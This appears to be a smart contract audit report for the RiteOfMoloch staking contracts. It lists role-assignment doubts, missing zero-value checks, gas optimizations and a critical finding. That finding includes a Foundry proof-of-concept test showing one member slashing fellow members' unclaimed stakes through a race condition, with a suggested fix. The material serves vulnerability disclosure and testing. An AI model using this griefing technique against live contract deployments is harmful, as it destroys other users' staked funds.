## Smart Contract Review Notes

### Unclear
- The tests in the original repository imply the the deployer gains `ADMIN` and `OPERATOR` roles on deployment. This is unclear at the moment as those roles seem to be assigned to the factory and not the address initiating the transaction. ( see @dev statements of `testDeploys()` in `RiteOfMoloch.t.sol`)

- week specified but not enforced
```
// enforce that the minimum time is greater than 1 week
require(newMaxTime > 0, "Minimum duration must be greater than 0!"); 
```

### Suggestions
- Insufficient 0-value checks. This might be a feature. Unclear, however it does go against general good practice.

### Concerns
- A new RiteOfMoloch instance can be successfully initialized with `InitData.threshold = 0`.
In such a state `isMember(anyAddress_)` results in a unnaccounted for EVM Error due to the fact that `InitData.membershipCriteria` is 0. Any call to dao will have same result. The same applies for `InitData.stakingAsset`: can be zero and transfersFrom address(0) will error.
- `isMember(address user) public view returns (bool memberStatus)`: return value declared but not used.

### Optimizations

- in `isMember(address user) public view returns (bool memberStatus)` replace
    ```
        if (shares >= minimumShare) {
            return true;
        }

        else {
            return false;
        }
    ```
    with: `if (shares >= minimumShare) memberStatus = true;`

- `_darkRitual()` loop.

- `_claim()` - prioritizes checks-effects-interactions pattern
    ```
    function _claim() internal virtual returns (bool) {
            address msgSender = msg.sender; /// @note false-positive optimisation
            // enforce that the initiate has stake
            require(_staked[msgSender] > 0, "User has no stake!!");

            // store the user's balance
            uint256 balance = _staked[msgSender];

            // delete the balance
            delete _staked[msgSender];

            // delete the deadline timestamp
            delete deadlines[msgSender];

            // log data for this successful claim
            emit Claim(msgSender, balance);

            // return the new member's original stake
            return _token.transfer(msgSender, balance);
        }
    ```
- duplicate functionality. modifier and public function to determine if isMember.
- 


### Critical
- it is currently possible for a member to slash other members; where 'other members' have not (yet) claimed their stake back. The success of this depends on the order of transactions. Slashing does not check if one is or is not a member but if one (still) has a stake.  Members that can be slashed: (1) are members, (2) have not claimed their stake in context: deadline for becoming a member has passed.

    ```
    function testInitiateGriefingAttack() public {

        /// Thesis
        /// Any member can slash fellow members that have not yet claimed their stake back after deadline.
        /// this opens up a race condition  / griefing attack
        /// no gain mostly pain

        /// actors
        address hasClainedUngriefable = address(bytes20(keccak256("hasClaimedUngriefable")));
        address hasNotClaimedGriefable = address(bytes20(keccak256("hasNotClaimedGriefable")));
        address hackermansMember = address(bytes20(keccak256("hackermansMember")));

        /// mainnet cohort initialization params (https://blockscout.com/xdai/mainnet/tx/0xe8123d8b9b4e563bcd1bc8e91f48f6a43087edb787ad96fdd2af693037e7638a)

        address moloch = address(fakeMoloch);
        address implementation = 0x4589b0760baD5fAfBdAD8f3e8227991e8Ee99160;
        address treasury = implementation;
        uint assetAmount = 5000000000000000000000;
        uint maxTime = 15780000;

        address realRaidWhale =  0x187089B33E5812310Ed32A57F53B3fAD0383a19D;
        //raidWhale = realRaidWhale;
        //raidToken = MockRaid(stakingAsset); // ERC20
        address raidTokenAddress = address(raidToken);

        /// fund actors
        vm.startPrank(raidWhale, raidWhale);
        raidToken.transfer(hasClainedUngriefable, assetAmount);
        raidToken.transfer(hasNotClaimedGriefable, assetAmount); 
        raidToken.transfer(hackermansMember, assetAmount); 
        vm.stopPrank();


        InitD = InitData(moloch, raidTokenAddress, moloch, 100, assetAmount, maxTime, "Rite of Moloch - Cohort V", "ROM", "https://ipfs.io/ipfs/Qmd286K6pohQcTKYqnS1YhWrCiS4gz7Xi34sdwMe9USZ7u");  
        address at = riteFactory.createCohort(InitD, 1);
        console.log(at);
        riteOfMoloch = RiteOfMoloch(at);

    
        /// 3 join initiation pack
        vm.prank(hasClainedUngriefable,hasClainedUngriefable);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hasClainedUngriefable,hasClainedUngriefable);
        riteOfMoloch.joinInitiation(hasClainedUngriefable);
        assertTrue(riteOfMoloch.isMember(hasClainedUngriefable)); //fake

        skip(100);

        vm.prank(hasNotClaimedGriefable,hasNotClaimedGriefable);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hasNotClaimedGriefable,hasNotClaimedGriefable);
        riteOfMoloch.joinInitiation(hasNotClaimedGriefable); 
        assertTrue( riteOfMoloch.isMember(hasNotClaimedGriefable)); //fake

        skip(100);

        vm.prank(hackermansMember,hackermansMember);
        raidToken.approve(address(riteOfMoloch), type(uint).max);
        vm.prank(hackermansMember,hackermansMember);
        riteOfMoloch.joinInitiation(hackermansMember);
        assertTrue( riteOfMoloch.isMember(hackermansMember)); //fake
        ///

        skip(maxTime * 2);

        /// member slashes member that has not claimed yet <---- 'big trouble'
        address[] memory lambs = new address[](3);
        lambs[0] = hasClainedUngriefable;
        lambs[1] = hasNotClaimedGriefable;


        /// hackermaans has 0 slashed balance
        assertTrue(riteOfMoloch.totalSlash(hackermansMember) == 0, "script kiddie already hackermans");

        /// on slash the .totalSlash() is incremented by _staked[initiate];
        /// if both slash assetAmount * number of labs slashed

        /// both lambs are member, but only one claims stake back
        uint bfClaim = raidToken.balanceOf(hasClainedUngriefable);
        vm.prank(hasClainedUngriefable, hasClainedUngriefable);
        riteOfMoloch.claimStake();
        assertTrue(bfClaim < raidToken.balanceOf(hasClainedUngriefable), "claim unsuccessful");
        
        vm.prank(hackermansMember, hackermansMember);
        riteOfMoloch.sacrifice(lambs);

        assertTrue(riteOfMoloch.totalSlash(hackermansMember) == 5000000000000000000000, "script kiddie for real");

        {
        /// check if still initiate
        assertTrue(riteOfMoloch.deadlines(lambs[0]) == 0, "still initialte");
        assertTrue(riteOfMoloch.deadlines(lambs[1]) == 0, "still initiate");
        }
        
        /// Potential Solution:
        // If member continue ! do not slash
        ```